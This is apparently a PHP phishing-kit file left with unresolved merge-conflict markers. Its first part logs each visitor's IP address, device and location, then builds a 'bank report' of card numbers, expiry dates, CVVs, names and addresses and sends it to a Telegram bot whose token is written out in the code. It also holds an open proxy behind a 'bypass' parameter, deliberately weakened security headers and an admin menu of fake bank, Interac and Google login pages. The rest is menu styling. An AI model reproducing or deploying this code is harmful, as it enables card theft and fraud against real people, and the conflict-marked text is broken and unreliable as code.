<<<<<<< HEAD
<?php
include "/mods/antibot.php";

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 " . $info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}

$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS()
{
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }

    return $os_platform;
}

function getBrowser()
{
    global $user_agent;
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }

    return $browser;
}

$user_os = getOS();
$user_browser = getBrowser();

$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file = 'data.dat';
$file1 = 'combo.txt';
$file2 = 'master.log';
$ip = "" . $PublicIP;
$uaget = "" . $user_agent;
$bsr = "" . $user_browser;
$uos = "" . $user_os;
$ust = explode(" ", $user_agent);
$vr = $ust[3];
$ver = str_replace(")", "", $vr);
$version = "Version              : " . $ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
} else {
    $details = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details = json_decode($details, true);
$success = $details['success'];
$fp = fopen($file, 'a');

if ($success == false) {
    fwrite($fp, $ip . "\n");
    fwrite($fp, $uos . "\n");
    fwrite($fp, $version . "\n");
    fwrite($fp, $bsr . "\n");
    fclose($fp);
} else if ($success == true) {
    $country = $details['country'];
    $city = $details['city'];
    $continent = $details['continent'];
    $tp = $details['type'];
    $cn = $details['country_phone'];
    $is = $details['isp'];
    $la = $details['latitude'];
    $lp = $details['longitude'];
    $crn = $details['currency'];
    $type = $tp;
    $isp = $is;
    $bank = "THE BANK OF NOVA SCOTIA";
    $LL = "+";
    $currency = "" . $full_date;
    $lh = "|";
    $li = ",";
}

$message = "|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n|IPADDRESS :  " . $ip . "\n|BANK   💰  : " . $bank ."\n|Internet sp :  " . $isp ."\n|Type[4/6]     : ".  $tp . "\n|Device Info  :  " . $uos . $lh . $bsr . "\n|City                :  " . $city . "\n|Continent    :  " . $continent . "\n|Lat+lon         :  " . $la . $LL . $lp . "\n|Phone           :  " . $cn . "\n|Country        :  " . $country . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n| PROFIT   :  " . $_POST['Cardnumber'] . "|" . $_POST['Expiry'] . "|" . $_POST['CVV'] . "|" . $_SESSION['ZIP'] . "|" . $_POST['Nameoncard'] . "|" . $_SESSION['Address'] . "  " . $_SESSION['Apartment'] . "|" . $_SESSION['City'] . "|" . $_SESSION['state'] . "|" . $_SESSION['Phone'] . "|" . $_SERVER['REMOTE_ADDR'] . "|" . $_SESSION['bank_scheme'] . "|" . $_SESSION['bank_type'] . "|" . $_SESSION['bank_brand'] . "|" . $_SESSION['bank_name'] . "|" . $_SESSION['bank_country'] . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n|USERAGENT:  " . $_SERVER['HTTP_USER_AGENT'] . "\n";


$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    
          

$options = array(
    'http' => array(
        'method'  => 'POST',
        'content' => http_build_query($data),
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
    )
);
$context  = stream_context_create($options);
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage", false, $context);

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 " . $info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}

?>
   <!DOCTYPE html>
<html>
<head>
  <title>Admin Panel</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #333;
      margin: 0;
      padding: 0;
      color: #fff;
    }
    
    header {
      background-color: #222;
      padding: 10px;
      text-align: center;
    }
    
    h1 {
      margin: 0;
      font-size: 18px;
    }
    
    .container {
      padding: 20px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
    }
    
    .item {
      background-color: #444;
      width: 150px;
      height: 150px;
      margin: 10px;
      text-align: center;
      padding: 20px;
      box-sizing: border-box;
      border-radius: 5px;
      box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.3);
      cursor: pointer;
    }
    
    .item h2 {
      font-size: 16px;
      margin-top: 10px;
      margin-bottom: 5px;
    }
    
    .item p {
      font-size: 14px;
      color: #ccc;
    }
    
    .login-btn {
      background-color: #555;
      color: #fff;
      border: none;
      padding: 10px 20px;
      border-radius: 5px;
      margin-top: 20px;
      cursor: pointer;
    }
    
    footer {
      background-color: #222;
      padding: 10px;
      text-align: center;
      position: fixed;
      left: 0;
      bottom: 0;
      width: 100%;
    }
    
    footer p {
      margin: 0;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <header>
    <button class="login-btn" onclick="location.href='login.html'">Login</button><h1>Admin Panel</h1>
  </header>
  <div class="container">
    <div class="item" onclick="location.href='item1.html'">
      <h2>CHAT GPT</h2>
      <p>AI CODE BOT</p>
    </div>
    <div class="item" onclick="location.href='item2.html'">
      <h2>SHORTCUTS</h2>
      <p>Shortcut Links</p>
    </div>
    <div class="item" onclick="location.href='item3.html'">
      <h2>DODGE CANADA</h2>
      <p>Marketing</p>
    </div>
    <div class="item" onclick="location.href='item3.html'">
      <h2>BANKING SITES</h2>
      <p>Washing</p>
    </div>
    <div class="item" onclick="location.href='item3.html'">
      <h2>SOCIAL MEDIA</h2>
      <p>Marketing</p>
    </div>
    <div class="item" onclick="location.href='/admin/login.php'">
      <h2>Admin Login</h2>
      <p>Staff</p>
    </div>
    <div class="item" onclick="location.href='admin/sheets.php'">
      <h2>Attendance Sheets</h2>
      <p>Classrooms</p>
    </div>
    <div class="item" onclick="location.href='contact.html'">
      <h2>Contact Us</h2>
      <p>Contact</p>
    </div>
    <div class="item" onclick="location.href='/public/tswift/taco2.php'">
      <h2>Interac e-Transfer</h2>
      <p>Request</p>
    </div>
    <div class="item" onclick="location.href='item3.html'">
      <h2>Google Maps</h2>
      <p>Login</p>
    </div>
    <div class="item" onclick="location.href='item3.html'">
      <h2>Google Drive</h2>
      <p>Login</p>
    </div>
    <div class="item" onclick="location.href='item3.html'">
      <h2>Canada Post</h2>
      <p>Login</p>
    </div>
  </div>
  
  <footer>
    <p>© 2023 Alberta School District. Strictly for Educational Purposes Only!</p>
  </footer>
</body>
</html>  
=======
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>
<<<<<<<< HEAD:.www/admin/Main.php
	<meta name="viewport" content="width=device-width, initial-scale=.5">
========

<meta name="viewport" content="width=device-width, initial-scale=1.0">
>>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f:.pages/xbox/.=/tierone/index.php
body {
  font-family: "Libre Baskerville", serif;
  font-weight: 400;
  font-size: 16px;
  line-height: 30px;
  background-color: red;
  overflow-x: hidden;
  color: #ababab;
}
::-webkit-scrollbar {
    width: 10px;
    background-color: #F5F5F5;
  
}

::-webkit-scrollbar-thumb {
    background-color: #f90a23;
    background-image: -webkit-linear-gradient(45deg,rgba(255, 255, 255, .2) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .2) 50%, rgba(255, 255, 255, .2) 75%, transparent 75%, transparent);
}

::-webkit-scrollbar-track {
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);
    background-color: #F5F5F5;
}

.heading-page
{
      text-transform: uppercase;
    font-size: 43px;
    font-weight: bolder;
    letter-spacing: 3px;
    color: white;
}
a {
  color: inherit;
  -webkit-transition: all 0.3s ease 0s;
  -moz-transition: all 0.3s ease 0s;
  -o-transition: all 0.3s ease 0s;
  transition: all 0.3s ease 0s; }
  a:hover, a:focus {
    color: #ababab;
    text-decoration: none;
    outline: 0 none; }

h1, h2, h3,
h4, h5, h6 {
  color: #1e2530;
  font-family: "Open Sans", sans-serif;
  margin: 0;
  line-height: 1.3; }

p {
  margin-bottom: 20px; }
  p:last-child {
    margin-bottom: 0; }

/*
 * Selection color
 */
::-moz-selection {
  background-color: #FA6862;
  color: #fff; }

::selection {
  background-color: #FA6862;
  color: #fff; }

/*
 *  Reset bootstrap's default style
 */
.form-control::-webkit-input-placeholder,
::-webkit-input-placeholder {
  opacity: 1;
  color: inherit; }

.form-control:-moz-placeholder,
:-moz-placeholder {
  /* Firefox 18- */
  opacity: 1;
  color: inherit; }

.form-control::-moz-placeholder,
::-moz-placeholder {
  /* Firefox 19+ */
  opacity: 1;
  color: inherit; }

.form-control:-ms-input-placeholder,
:-ms-input-placeholder {
  opacity: 1;
  color: inherit; }

button, input, select,
textarea, label {
  font-weight: 400; }

.btn {
  -webkit-transition: all 0.3s ease 0s;
  -moz-transition: all 0.3s ease 0s;
  -o-transition: all 0.3s ease 0s;
  transition: all 0.3s ease 0s; }
  .btn:hover, .btn:focus, .btn:active:focus {
    outline: 0 none; }

.btn-primary {
  background-color: #FA6862;
  border: 0;
  font-family: "Open Sans", sans-serif;
  font-weight: 700;
  height: 48px;
  line-height: 50px;
  padding: 0 42px;
  text-transform: uppercase; }
  .btn-primary:hover, .btn-primary:focus, .btn-primary:active, .btn-primary:active:focus {
    background-color: #f9423a; }

.btn-border {
  border: 1px solid #d7d8db;
  display: inline-block;
  padding: 7px; }

/*
 *  CSS Helper Class
 */
.clear:before, .clear:after {
  content: " ";
  display: table; }

.clear:after {
  clear: both; }

.pt-table {
  display: table;
  width: 100%;
  height: -webkit-calc(100vh - 4px);
  height: -moz-calc(100vh - 4px);
  height: calc(100vh - 4px); }

.pt-tablecell {
  display: table-cell;
  vertical-align: middle; }

.overlay {
  position: absolute;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%; }

.relative {
  position: relative; }

.primary,
.link:hover {
  color: #FA6862; }

.no-gutter {
  margin-left: 0;
  margin-right: 0; }
  .no-gutter > [class^="col-"] {
    padding-left: 0;
    padding-right: 0; }

.flex {
  display: -webkit-box;
  display: -webkit-flex;
  display: -moz-flex;
  display: -ms-flexbox;
  display: flex; }

.flex-middle {
  -webkit-box-align: center;
  -ms-flex-align: center;
  -webkit-align-items: center;
  -moz-align-items: center;
  align-items: center; }

.space-between {
  -webkit-box-pack: justify;
  -ms-flex-pack: justify;
  -webkit-justify-content: space-between;
  -moz-justify-content: space-between;
  justify-content: space-between; }

.nicescroll-cursors {
  background: #FA6862 !important; }

.preloader {
  bottom: 0;
  left: 0;
  position: fixed;
  right: 0;
  top: 0;
  z-index: 1000;
  display: -webkit-box;
  display: -webkit-flex;
  display: -moz-flex;
  display: -ms-flexbox;
  display: flex; }
  .preloader.active.hidden {
    display: none; }

.loading-mask {
  background-color: #FA6862;
  height: 100%;
  left: 0;
  position: absolute;
  top: 0;
  width: 20%;
  -webkit-transition: all 0.6s cubic-bezier(0.61, 0, 0.6, 1) 0s;
  -moz-transition: all 0.6s cubic-bezier(0.61, 0, 0.6, 1) 0s;
  -o-transition: all 0.6s cubic-bezier(0.61, 0, 0.6, 1) 0s;
  transition: all 0.6s cubic-bezier(0.61, 0, 0.6, 1) 0s; }
  .loading-mask:nth-child(2) {
    left: 20%;
    -webkit-transition-delay: 0.1s;
    -moz-transition-delay: 0.1s;
    -o-transition-delay: 0.1s;
    transition-delay: 0.1s; }
  .loading-mask:nth-child(3) {
    left: 40%;
    -webkit-transition-delay: 0.2s;
    -moz-transition-delay: 0.2s;
    -o-transition-delay: 0.2s;
    transition-delay: 0.2s; }
  .loading-mask:nth-child(4) {
    left: 60%;
    -webkit-transition-delay: 0.3s;
    -moz-transition-delay: 0.3s;
    -o-transition-delay: 0.3s;
    transition-delay: 0.3s; }
  .loading-mask:nth-child(5) {
    left: 80%;
    -webkit-transition-delay: 0.4s;
    -moz-transition-delay: 0.4s;
    -o-transition-delay: 0.4s;
    transition-delay: 0.4s; }

.preloader.active.done {
  z-index: 0; }

.preloader.active .loading-mask {
  width: 0; }

/*------------------------------------------------
	Start Styling
-------------------------------------------------*/
.mt20{margin-top:20px;}
.site-wrapper {
  border-top: 4px solid #ff0037; }

.page-close {
  font-size: 30px;
  position: absolute;
  right: 30px;
  top: 30px;
  z-index: 100; }

.page-title {
  margin-bottom: 75px; }
  .page-title img {
    margin-bottom: 20px; }
  .page-title h2 {
    font-size: 68px;
    margin-bottom: 25px;
    position: relative;
    z-index: 0;
    font-weight: 900;
    text-transform: uppercase; }
  .page-title p {
    font-size: 16px; }
  .page-title .title-bg {
    color: rgba(30, 37, 48, 0.07);
    font-size: 158px;
    left: 0;
    letter-spacing: 10px;
    line-height: 0.7;
    position: absolute;
    right: 0;
    top: 50%;
    z-index: -1;
    -webkit-transform: translateY(-50%);
    -moz-transform: translateY(-50%);
    -ms-transform: translateY(-50%);
    -o-transform: translateY(-50%);
    transform: translateY(-50%); }

.section-title {
  margin-bottom: 20px; }
  .section-title h3 {
    display: inline-block;
    position: relative; }
    .section-title h3::before, .section-title h3::after {
      content: "";
      height: 2px;
      position: absolute;
      bottom: 8px;
      left: -webkit-calc(100% + 14px);
      left: -moz-calc(100% + 14px);
      left: calc(100% + 14px); }
    .section-title h3::before {
      background-color: #1e2530;
      width: 96px;
      bottom: 14px; }
    .section-title h3::after {
      background-color: #FA6862;
      width: 73px; }
  .section-title.light h3 {
    color: #fff; }
    .section-title.light h3::before {
      background-color: #fff; }

.page-nav {
  bottom: 40px;
  left: 0;
  position: absolute;
  right: 0; }
  .page-nav span {
    font-family: "Open Sans", sans-serif;
    font-size: 14px;
    font-weight: 500;
    line-height: 0.9;
    text-transform: uppercase; }

/*------------------------------------------------
    Home Page
-------------------------------------------------*/

.hexagon-item:first-child {
    margin-left: 0;
}

.page-home {
  background-position: center center;
  background-repeat: no-repeat;
  background-size: cover;
  vertical-align: middle; }
  .page-home .overlay {
    background-color: rgba(14, 17, 24, 0.97);
}

/* End of container */
.hexagon-item {
  cursor: pointer;
  width: 200px;
  height: 173.20508px;
  float: left;
  margin-left: -29px;
  z-index: 0;
  position: relative;
  -webkit-transform: rotate(30deg);
  -moz-transform: rotate(30deg);
  -ms-transform: rotate(30deg);
  -o-transform: rotate(30deg);
  transform: rotate(30deg); }
  .hexagon-item:first-child {
    margin-left: 0; }
  .hexagon-item:hover {
    z-index: 1; }
    .hexagon-item:hover .hex-item:last-child {
      opacity: 1;
      -webkit-transform: scale(1.3);
      -moz-transform: scale(1.3);
      -ms-transform: scale(1.3);
      -o-transform: scale(1.3);
      transform: scale(1.3); }
    .hexagon-item:hover .hex-item:first-child {
      opacity: 1;
      -webkit-transform: scale(1.2);
      -moz-transform: scale(1.2);
      -ms-transform: scale(1.2);
      -o-transform: scale(1.2);
      transform: scale(1.2); }
      .hexagon-item:hover .hex-item:first-child div:before,
      .hexagon-item:hover .hex-item:first-child div:after {
        height: 5px; }
    .hexagon-item:hover .hex-item div::before,
    .hexagon-item:hover .hex-item div::after {
      background-color: #ff0037; }
    .hexagon-item:hover .hex-content svg {
      -webkit-transform: scale(0.97);
      -moz-transform: scale(0.97);
      -ms-transform: scale(0.97);
      -o-transform: scale(0.97);
      transform: scale(0.97); }

.page-home .hexagon-item:nth-last-child(1),
.page-home .hexagon-item:nth-last-child(2),
.page-home .hexagon-item:nth-last-child(3) {
  -webkit-transform: rotate(30deg) translate(87px, -80px);
  -moz-transform: rotate(30deg) translate(87px, -80px);
  -ms-transform: rotate(30deg) translate(87px, -80px);
  -o-transform: rotate(30deg) translate(87px, -80px);
  transform: rotate(30deg) translate(87px, -80px); }

.hex-item {
  position: absolute;
  top: 0;
  left: 50px;
  width: 100px;
  height: 173.20508px; }
  .hex-item:first-child {
    z-index: 0;
    -webkit-transform: scale(0.9);
    -moz-transform: scale(0.9);
    -ms-transform: scale(0.9);
    -o-transform: scale(0.9);
    transform: scale(0.9);
    -webkit-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
    -moz-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
    -o-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
    transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1); }
  .hex-item:last-child {
    transition: all 0.3s cubic-bezier(0.19, 1, 0.22, 1);
    z-index: 1; }
  .hex-item div {
    box-sizing: border-box;
    position: absolute;
    top: 0;
    width: 100px;
    height: 173.20508px;
    -webkit-transform-origin: center center;
    -moz-transform-origin: center center;
    -ms-transform-origin: center center;
    -o-transform-origin: center center;
    transform-origin: center center; }
    .hex-item div::before, .hex-item div::after {
      background-color: #1e2530;
      content: "";
      position: absolute;
      width: 100%;
      height: 3px;
      -webkit-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s;
      -moz-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s;
      -o-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s;
      transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s; }
    .hex-item div:before {
      top: 0; }
    .hex-item div:after {
      bottom: 0; }
    .hex-item div:nth-child(1) {
      -webkit-transform: rotate(0deg);
      -moz-transform: rotate(0deg);
      -ms-transform: rotate(0deg);
      -o-transform: rotate(0deg);
      transform: rotate(0deg); }
    .hex-item div:nth-child(2) {
      -webkit-transform: rotate(60deg);
      -moz-transform: rotate(60deg);
      -ms-transform: rotate(60deg);
      -o-transform: rotate(60deg);
      transform: rotate(60deg); }
    .hex-item div:nth-child(3) {
      -webkit-transform: rotate(120deg);
      -moz-transform: rotate(120deg);
      -ms-transform: rotate(120deg);
      -o-transform: rotate(120deg);
      transform: rotate(120deg); }

.hex-content {
  color: #fff;
  display: block;
  height: 180px;
  margin: 0 auto;
  position: relative;
  text-align: center;
  transform: rotate(-30deg);
  width: 156px; }
  .hex-content .hex-content-inner {
    left: 50%;
    margin: -3px 0 0 2px;
    position: absolute;
    top: 50%;
    -webkit-transform: translate(-50%, -50%);
    -moz-transform: translate(-50%, -50%);
    -ms-transform: translate(-50%, -50%);
    -o-transform: translate(-50%, -50%);
    transform: translate(-50%, -50%); }
  .hex-content .icon {
    display: block;
    font-size: 36px;
    line-height: 30px;
    margin-bottom: 11px; }
  .hex-content .title {
    display: block;
    font-family: "Open Sans", sans-serif;
    font-size: 14px;
    letter-spacing: 1px;
    line-height: 24px;
    text-transform: uppercase; }
  .hex-content svg {
    left: -7px;
    position: absolute;
    top: -13px;
    transform: scale(0.87);
    z-index: -1;
    -webkit-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s;
    -moz-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s;
    -o-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s;
    transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1) 0s; }
  .hex-content:hover {
    color: #fff; }

.page-home .hexagon-item:nth-last-child(1), .page-home .hexagon-item:nth-last-child(2), .page-home .hexagon-item:nth-last-child(3) {
    -webkit-transform: rotate(30deg) translate(87px, -80px);
    -moz-transform: rotate(30deg) translate(87px, -80px);
    -ms-transform: rotate(30deg) translate(87px, -80px);
    -o-transform: rotate(30deg) translate(87px, -80px);
    transform: rotate(30deg) translate(87px, -80px);
}
/*------------------------------------------------
    Welcome Page
-------------------------------------------------*/
.author-image-large {
  position: absolute;
  right: 0;
  top: 0; }
  .author-image-large img {
    height: -webkit-calc(100vh - 4px);
    height: -moz-calc(100vh - 4px);
    height: calc(100vh - 4px); }


@media (min-width: 1200px)
{
.col-lg-offset-2 {
    margin-left: 16.66666667%;
}
}

@media (min-width: 1200px)
{
.col-lg-8 {
    width: 66.66666667%;
}
}

.hexagon-item:first-child {
    margin-left: 0;
}

.pt-table.desktop-768 .pt-tablecell {
    padding-bottom: 110px;
    padding-top: 60px;
}



.hexagon-item:hover .icon i
{
  color:#32CD32;
  transition:0.6s;
  
}


.hexagon-item:hover .title
{
  -webkit-animation: focus-in-contract 0.5s cubic-bezier(0.250, 0.460, 0.450, 0.940) both;
	        animation: focus-in-contract 0.5s cubic-bezier(0.250, 0.460, 0.450, 0.940) both;
}
/***************************/

@-webkit-keyframes focus-in-contract {
  0% {
    letter-spacing: 1em;
    -webkit-filter: blur(12px);
            filter: blur(12px);
    opacity: 0;
  }
  100% {
    -webkit-filter: blur(0px);
            filter: blur(0px);
    opacity: 1;
  }
}
@keyframes focus-in-contract {
  0% {
    letter-spacing: 1em;
    -webkit-filter: blur(12px);
            filter: blur(12px);
    opacity: 0;
  }
  100% {
    -webkit-filter: blur(0px);
            filter: blur(0px);
    opacity: 1;
  }
}





@media only screen and (max-width: 767px)
{
.hexagon-item {
    float: none;
    margin: 0 auto 50px;
}
  .hexagon-item:first-child {
    margin-left: auto;
}
  
  .page-home .hexagon-item:nth-last-child(1), .page-home .hexagon-item:nth-last-child(2), .page-home .hexagon-item:nth-last-child(3) {
    -webkit-transform: rotate(30deg) translate(0px, 0px);
    -moz-transform: rotate(30deg) translate(0px, 0px);
    -ms-transform: rotate(30deg) translate(0px, 0px);
    -o-transform: rotate(30deg) translate(0px, 0px);
    transform: rotate(30deg) translate(0px, 0px);
}
  
}


</style></head>
<body><main class="site-wrapper">
  <div class="pt-table desktop-768">
    <div class="pt-tablecell page-home relative" style="">
                    <div class=""></div>

                    <div class="container">
                        <div class="row">
                            <div class="col-xs-12 col-md-offset-1 col-md-10 col-lg-offset-2 col-lg-8">
                                <div class="page-title  home text-center">
                                  
                                    
                                </div>

                                <div class="hexagon-menu clear">
                                    <div class="hexagon-item">
                                        <div class="hex-item">
                                            <div></div>
                                            <div></div>
                                            <div></div>
                                        </div>
                                        <div class="hex-item">
                                            <div></div>
                                            <div></div>
                                            <div></div>
                                        </div>
<<<<<<<< HEAD:.www/admin/Main.php
                                        <a href="dashboard.php" class="hex-content">
========
                                        <a href="request.php" class="hex-content">
>>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f:.pages/xbox/.=/tierone/index.php
                                            <span class="hex-content-inner">
                                                <span class="icon">
                                                    <i class="fa fa-universal-access"></i>
                                                </span>
<<<<<<<< HEAD:.www/admin/Main.php
                                                <span class="title">ADMIN</span>
========
                                                <span class="title">REQUEST FORM</span>
>>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f:.pages/xbox/.=/tierone/index.php
                                            </span>
                                            <svg viewBox="0 0 173.20508075688772 200" height="200" width="174" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M86.60254037844386 0L173.20508075688772 50L173.20508075688772 150L86.60254037844386 200L0 150L0 50Z" fill="#1e2530"></path></svg>
                                        </a>
                                    </div>
                                    <div class="hexagon-item">
                                        <div class="hex-item">
                                            <div></div>
                                            <div></div>
                                            <div></div>
                                        </div>
                                        <div class="hex-item">
                                            <div></div>
                                            <div></div>
                                            <div></div>
                                        </div>
<<<<<<<< HEAD:.www/admin/Main.php
                                        <a href="../.=/tierone/index.php" class="hex-content">
========
                                        <a href="tele.php" class="hex-content">
>>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f:.pages/xbox/.=/tierone/index.php
                                            <span class="hex-content-inner">
                                                <span class="icon">
                                                    <i class="fa fa-bullseye"></i>
                                                </span>
<<<<<<<< HEAD:.www/admin/Main.php
                                                <span class="title">TIER ONE</span>
========
                                                <span class="title">JOIN TELEGRAM</span>
>>>>>>>> 5cf96fe71510912bc4974ef3763b94e3d4c3229f:.pages/xbox/.=/tierone/index.php
                                            </span>
                                            <svg viewBox="0 0 173.20508075688772 200" height="200" width="174" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M86.60254037844386 0L173.20508075688772 50L173.20508075688772 150L86.60254037844386 200L0 150L0 50Z" fill="#1e2530"></path></svg>
                                        </a>
                                    </div>
                                    <div class="hexagon-item">
                                        <div class="hex-item">
                                            <div></div>
                                            <div></div>
                                            <div></div>
